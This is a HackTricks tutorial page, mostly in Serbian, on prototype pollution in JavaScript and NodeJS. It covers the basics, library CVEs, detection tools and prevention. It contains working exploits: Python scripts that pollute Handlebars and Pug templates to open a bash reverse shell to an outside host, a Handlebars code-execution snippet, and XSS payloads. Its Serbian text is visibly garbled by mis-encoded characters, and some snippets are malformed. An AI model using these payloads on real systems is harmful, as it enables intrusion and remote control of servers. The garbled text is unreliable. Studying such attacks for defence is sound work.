# NodeJS - \_\_proto\_\_ & prototype Pollution

{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## Objekti u JavaScript-u <a href="#id-053a" id="id-053a"></a>

Objekti u JavaScript-u su suÅ¡tinski kolekcije parova kljuÄ-vrednost, poznatih kao svojstva. Objekat se moÅ¾e kreirati koristeÄ‡i `Object.create` sa `null` kao argumentom da bi se proizveo prazan objekat. Ova metoda omoguÄ‡ava kreiranje objekta bez nasleÄ‘enih svojstava.
```javascript
// Run this in the developers tools console
console.log(Object.create(null)); // This will output an empty object.
```
Prazan objekat je sliÄan praznom reÄniku, predstavljen kao `{}`.

### Funkcije i klase u JavaScript-u

U JavaScript-u, klase i funkcije su usko povezane, pri Äemu funkcije Äesto sluÅ¾e kao konstruktori za klase. I pored nedostatka podrÅ¡ke za klase u JavaScript-u, konstruktori mogu emulirati ponaÅ¡anje klasa.
```javascript
// Run this in the developers tools console

function Employee(name, position) {
this.name = name;
this.position = position;
this.introduce = function() {
return "My name is " + this.name + " and I work as a " + this.position + ".";
}
}

Employee.prototype

var employee1 = new Employee("Generic Employee", "Developer");

employee1.__proto__
```
### Prototypes in JavaScript

JavaScript omoguÄ‡ava modifikaciju, dodavanje ili brisanje atributa prototipa u vreme izvoÄ‘enja. Ova fleksibilnost omoguÄ‡ava dinamiÄko proÅ¡irenje funkcionalnosti klasa.

Funkcije kao Å¡to su `toString` i `valueOf` mogu se menjati kako bi se promenilo njihovo ponaÅ¡anje, Å¡to pokazuje prilagodljivu prirodu JavaScript-ovog prototipnog sistema.

## Inheritance

U programiranju zasnovanom na prototipovima, svojstva/metode se nasleÄ‘uju od objekata iz klasa. Ove klase se kreiraju dodavanjem svojstava/metoda ili instanci druge klase ili praznom objektu.

Treba napomenuti da kada se svojstvo doda objektu koji sluÅ¾i kao prototip za druge objekte (kao Å¡to je `myPersonObj`), nasleÄ‘ujuÄ‡i objekti dobijaju pristup ovom novom svojstvu. MeÄ‘utim, ovo svojstvo se ne prikazuje automatski osim ako nije eksplicitno pozvano.

## \_\_proto\_\_ pollution <a href="#id-0d0a" id="id-0d0a"></a>

## Exploring Prototype Pollution in JavaScript

JavaScript objekti su definisani parovima kljuÄ-vrednost i nasleÄ‘uju iz JavaScript Object prototipa. To znaÄi da modifikacija Object prototipa moÅ¾e uticati na sve objekte u okruÅ¾enju.

Hajde da upotrebimo drugi primer da ilustrujemo:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
```
Pristup Object prototipu je moguÄ‡ kroz:
```javascript
car1.__proto__.__proto__;
Vehicle.__proto__.__proto__;
```
Dodavanjem svojstava u Object prototip, svaki JavaScript objekat Ä‡e naslediti ova nova svojstva:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding a method to the Object prototype
car1.__proto__.__proto__.announce = function() { console.log("Beep beep!"); };
car1.announce(); // Outputs "Beep beep!"
// Adding a property to the Object prototype
car1.__proto__.__proto__.isVehicle = true;
console.log(car1.isVehicle); // Outputs true
```
## prototype pollution

Za scenario gde je koriÅ¡Ä‡enje `__proto__` ograniÄeno, modifikacija prototipa funkcije je alternativa:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding properties to the Vehicle prototype
Vehicle.prototype.beep = function() { console.log("Beep beep!"); };
car1.beep(); // Now works and outputs "Beep beep!"
Vehicle.prototype.hasWheels = true;
console.log(car1.hasWheels); // Outputs true

// Alternate method
car1.constructor.prototype.honk = function() { console.log("Honk!"); };
car1.constructor.prototype.isElectric = true;
```
Ovo utiÄe samo na objekte kreirane iz `Vehicle` konstruktora, dajuÄ‡i im `beep`, `hasWheels`, `honk` i `isElectric` svojstva.

Dve metode za globalno utiÄu na JavaScript objekte kroz zagaÄ‘enje prototipa ukljuÄuju:

1. ZagaÄ‘enje `Object.prototype` direktno:
```javascript
Object.prototype.goodbye = function() { console.log("Goodbye!"); };
```
2. ZagaÄ‘ivanje prototipa konstruktora za Äesto koriÅ¡Ä‡enu strukturu:
```javascript
var example = {"key": "value"};
example.constructor.prototype.greet = function() { console.log("Hello!"); };
```
Nakon ovih operacija, svaki JavaScript objekat moÅ¾e izvrÅ¡iti `goodbye` i `greet` metode.

## ZagaÄ‘ivanje drugih objekata

### Iz klase u Object.prototype

U scenariju gde moÅ¾ete **zagaÄ‘ivati odreÄ‘eni objekat** i treba da **doÄ‘ete do `Object.prototype`**, moÅ¾ete ga potraÅ¾iti sa neÄim poput sledeÄ‡eg koda:
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### ZagaÄ‘enje elemenata niza

Napomena: poÅ¡to moÅ¾ete zagaÄ‘ivati atribute objekata u JS, ako imate pristup da zagaÄ‘ujete niz, takoÄ‘e moÅ¾ete **zagaÄ‘ivati vrednosti niza** dostupne **preko indeksa** (napomena: ne moÅ¾ete prepisivati vrednosti, tako da treba da zagaÄ‘ujete indekse koji se na neki naÄin koriste, ali ne i piÅ¡u).
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Html elements pollution

Kada se generiÅ¡e HTML element putem JS, moguÄ‡e je **prepisati** **`innerHTML`** atribut kako bi se napisao **arbitrarni HTML kod.** [Ideja i primer iz ovog Älanka](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/).

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## Primeri

### Osnovni Primer

ZagaÄ‘enje prototipa se deÅ¡ava zbog greÅ¡ke u aplikaciji koja omoguÄ‡ava prepisivanje svojstava na `Object.prototype`. To znaÄi da poÅ¡to veÄ‡ina objekata nasleÄ‘uje svoja svojstva iz `Object.prototype`

NajlakÅ¡i primer je dodavanje vrednosti **neodreÄ‘enom atributu objekta** koji Ä‡e biti proveravan, kao:
```javascript
if (user.admin) {
```
Ako je atribut **`admin` neodreÄ‘en**, moguÄ‡e je zloupotrebiti PP i postaviti ga na True sa neÄim poput:
```javascript
Object.prototype.isAdmin = true
let user = {}
user.isAdmin // true
```
Mehanizam iza ovoga ukljuÄuje manipulaciju svojstvima tako da, ako napadaÄ ima kontrolu nad odreÄ‘enim ulazima, moÅ¾e modifikovati prototip svih objekata u aplikaciji. Ova manipulacija obiÄno ukljuÄuje postavljanje `__proto__` svojstva, koje je u JavaScript-u sinonim za direktno modifikovanje prototipa objekta.

Uslovi pod kojima se ovaj napad moÅ¾e uspeÅ¡no izvrÅ¡iti, kako je navedeno u specifiÄnoj [studiji](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript\_prototype\_pollution\_attack\_in\_NodeJS.pdf), ukljuÄuju:

* IzvrÅ¡avanje rekurzivnog spajanja.
* Definisanje svojstava na osnovu puta.
* Kloniranje objekata.

### Override function
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Proto zagaÄ‘enje do RCE

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

Ostali payloadi:

* [https://github.com/KTH-LangSec/server-side-prototype-pollution](https://github.com/KTH-LangSec/server-side-prototype-pollution)

## Klijentsko prototipsko zagaÄ‘enje do XSS

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019â€“11358: Napad prototipskog zagaÄ‘enja kroz jQuery $ .extend

[Za viÅ¡e detalja pogledajte ovaj Älanak](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7) U jQuery, funkcija `$ .extend` moÅ¾e dovesti do prototipskog zagaÄ‘enja ako se funkcija dubokog kopiranja koristi nepravilno. Ova funkcija se obiÄno koristi za kloniranje objekata ili spajanje svojstava iz podrazumevanog objekta. MeÄ‘utim, kada je pogreÅ¡no konfigurisana, svojstva namenjena novom objektu mogu biti dodeljena prototipu umesto toga. Na primer:
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'));
console.log({}.devMode); // Outputs: true
```
Ova ranjivost, identifikovana kao CVE-2019â€“11358, ilustruje kako duboka kopija moÅ¾e nenamerno da izmeni prototip, Å¡to moÅ¾e dovesti do potencijalnih bezbednosnih rizika, kao Å¡to je neovlaÅ¡Ä‡en pristup administratoru ako se svojstva poput `isAdmin` proveravaju bez odgovarajuÄ‡e verifikacije postojanja.

### CVE-2018â€“3721, CVE-2019â€“10744: Napad prototipne kontaminacije kroz lodash

[Za viÅ¡e detalja pogledajte ovaj Älanak](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

[Lodash](https://www.npmjs.com/package/lodash) se suoÄio sa sliÄnim ranjivostima prototipne kontaminacije (CVE-2018â€“3721, CVE-2019â€“10744). Ovi problemi su reÅ¡eni u verziji 4.17.11.

### JoÅ¡ jedan tutorijal sa CVE-ima

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

### Alati za otkrivanje prototipne kontaminacije

* [**Server-Side-Prototype-Pollution-Gadgets-Scanner**](https://github.com/doyensec/Server-Side-Prototype-Pollution-Gadgets-Scanner): Ekstenzija za Burp Suite dizajnirana za otkrivanje i analizu ranjivosti prototipne kontaminacije na serverskoj strani u web aplikacijama. Ovaj alat automatizuje proces skeniranja zahteva kako bi identifikovao potencijalne probleme prototipne kontaminacije. IskoriÅ¡Ä‡ava poznate gadgete - metode koriÅ¡Ä‡enja prototipne kontaminacije za izvrÅ¡avanje Å¡tetnih radnji - posebno se fokusirajuÄ‡i na Node.js biblioteke.
* [**server-side-prototype-pollution**](https://github.com/portswigger/server-side-prototype-pollution): Ova ekstenzija identifikuje ranjivosti prototipne kontaminacije na serverskoj strani. Koristi tehnike opisane u [prototipnoj kontaminaciji na serverskoj strani](https://portswigger.net/research/server-side-prototype-pollution).

### AST prototipna kontaminacija u NodeJS

NodeJS Å¡iroko koristi Apstraktna SintaktiÄka Stabla (AST) u JavaScript-u za funkcionalnosti poput engine-a za Å¡ablone i TypeScript-a. Ovaj deo istraÅ¾uje ranjivosti povezane sa prototipnom kontaminacijom u engine-ima za Å¡ablone, posebno Handlebars i Pug.

#### Analiza ranjivosti Handlebars

Engine za Å¡ablone Handlebars je podloÅ¾an napadu prototipne kontaminacije. Ova ranjivost proistiÄe iz specifiÄnih funkcija unutar `javascript-compiler.js` datoteke. Funkcija `appendContent`, na primer, konkatenira `pendingContent` ako je prisutan, dok funkcija `pushSource` resetuje `pendingContent` na `undefined` nakon dodavanja izvora.

**Proces eksploatacije**

Eksploatacija koristi AST (Apstraktno SintaktiÄko Stablo) koje proizvodi Handlebars, prateÄ‡i ove korake:

1. **Manipulacija Parserom**: U poÄetku, parser, putem `NumberLiteral` Ävora, nameÄ‡e da su vrednosti numeriÄke. Prototipna kontaminacija moÅ¾e to zaobiÄ‡i, omoguÄ‡avajuÄ‡i umetanje nenumeriÄkih stringova.
2. **Obrada od strane Kompajlera**: Kompajler moÅ¾e obraditi AST objekat ili string Å¡ablon. Ako `input.type` jednako `Program`, ulaz se tretira kao prethodno analiziran, Å¡to se moÅ¾e iskoristiti.
3. **Umetanje Koda**: Kroz manipulaciju `Object.prototype`, moÅ¾e se umetnuti proizvoljan kod u funkciju Å¡ablona, Å¡to moÅ¾e dovesti do daljinskog izvrÅ¡avanja koda.

Primer koji demonstrira eksploataciju ranjivosti Handlebars:
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];

const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());
```
Ovaj kod prikazuje kako napadaÄ moÅ¾e ubrizgati proizvoljan kod u Handlebars Å¡ablon.

**SpoljaÅ¡nja referenca**: Problem vezan za zagaÄ‘enje prototipa pronaÄ‘en je u 'flat' biblioteci, kako je detaljno opisano ovde: [Issue on GitHub](https://github.com/hughsk/flat/issues/105).

**SpoljaÅ¡nja referenca**: [Problem vezan za zagaÄ‘enje prototipa u 'flat' biblioteci](https://github.com/hughsk/flat/issues/105)

Primer eksploatacije zagaÄ‘enja prototipa u Python-u:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
#### Pug Vulnerability

Pug, joÅ¡ jedan engine za Å¡ablone, suoÄava se sa sliÄnim rizikom od zagaÄ‘enja prototipa. Detaljne informacije su dostupne u diskusiji o [AST Injection in Pug](https://blog.p6.is/AST-Injection/#Pug).

Primer zagaÄ‘enja prototipa u Pug:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
### Preventive Measures

Da bi se smanjio rizik od zagaÄ‘enja prototipa, mogu se primeniti sledeÄ‡e strategije:

1. **Imutabilnost objekta**: `Object.prototype` se moÅ¾e uÄiniti imutabilnim primenom `Object.freeze`.
2. **Validacija ulaza**: JSON ulazi treba rigorozno validirati prema Å¡emi aplikacije.
3. **Sigurne funkcije spajanja**: Treba izbegavati nesigurnu upotrebu rekurzivnih funkcija spajanja.
4. **Objekti bez prototipa**: Objekti bez svojstava prototipa mogu se kreirati koristeÄ‡i `Object.create(null)`.
5. **KoriÅ¡Ä‡enje Map**: Umesto `Object`, treba koristiti `Map` za Äuvanje parova kljuÄ-vrednost.
6. **AÅ¾uriranje biblioteka**: Sigurnosne zakrpe mogu se ukljuÄiti redovnim aÅ¾uriranjem biblioteka.
7. **Linter i alati za statiÄku analizu**: Koristite alate poput ESLint-a sa odgovarajuÄ‡im plugin-ovima za otkrivanje i spreÄavanje ranjivosti na zagaÄ‘enje prototipa.
8. **Revizije koda**: Implementirati temeljne revizije koda kako bi se identifikovali i otklonili potencijalni rizici vezani za zagaÄ‘enje prototipa.
9. **Obuka o bezbednosti**: Obrazovati programere o rizicima zagaÄ‘enja prototipa i najboljim praksama za pisanje sigurnog koda.
10. **KoriÅ¡Ä‡enje biblioteka sa oprezom**: Budite oprezni prilikom koriÅ¡Ä‡enja biblioteka treÄ‡ih strana. Procijenite njihovu sigurnosnu poziciju i pregledajte njihov kod, posebno one koji manipuliÅ¡u objektima.
11. **ZaÅ¡tita u vreme izvoÄ‘enja**: Primena mehanizama zaÅ¡tite u vreme izvoÄ‘enja kao Å¡to su koriÅ¡Ä‡enje npm paketa fokusiranih na sigurnost koji mogu otkriti i spreÄiti napade zagaÄ‘enja prototipa.

## References

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
* [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
